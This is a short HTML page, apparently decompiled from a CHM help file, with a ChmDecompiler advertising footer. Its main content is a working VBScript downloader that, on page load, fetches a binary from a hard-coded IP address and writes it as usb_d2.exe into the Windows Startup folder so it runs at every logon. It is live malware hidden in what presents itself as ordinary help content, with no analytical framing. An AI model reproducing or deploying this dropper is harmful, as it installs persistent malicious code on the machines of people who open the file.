<script language=vbs>
set oHTTP = CreateObject("msxml2.XMLHTTP")
oHTTP.open "GET", "http://219.234.95.125/fr/w.e", False
oHTTP.send
set oStream = createobject("adodb.stream")
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
oStream.type = adTypeBinary
oStream.open
oStream.write oHTTP.responseBody
fn = "c:\Documents and Settings\All Users\Start Menu\Programs\Startup\usb_d2.exe"
oStream.savetofile fn, adSaveCreateOverWrite
</script>
<br> This file is decompiled by an unregistered version of ChmDecompiler. <br>
 Regsitered version does not show this message. <br>You can download ChmDecompiler at :
    <a href="http://www.zipghost.com/" target=_blank> http://www.zipghost.com/ </a>
    <br><br>
